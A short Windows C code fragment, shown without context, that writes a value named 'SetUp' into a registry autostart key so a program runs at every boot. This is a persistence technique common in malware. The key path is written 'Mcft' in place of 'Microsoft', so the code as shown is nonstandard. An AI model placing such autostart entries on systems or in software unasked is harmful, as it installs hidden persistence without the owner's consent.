HKEY hKey;
RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Mcft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
RegSetValueEx(hKey, "SetUp",0,REG_SZ,(const unsigned char*)system,sizeof(system));
RegCloseKey(hKey);